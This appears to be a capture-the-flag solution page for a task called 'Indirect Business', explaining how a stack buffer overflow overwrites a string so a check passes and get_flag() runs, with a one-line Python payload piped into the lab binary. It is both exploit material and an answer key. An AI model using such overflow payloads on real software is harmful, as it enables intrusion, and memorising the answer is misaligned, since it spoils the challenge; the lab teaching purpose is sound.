---
nav_order: 1
parent: 'Task: Indirect Business'
---

# Solution

Use the buffer overflow to overwrite a string on the stack.
This is going to be copied to a global variable that is checked before calling the `get_flag()` function.

```sh
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*10 + b"Bye")' | ./buff-ovf
```
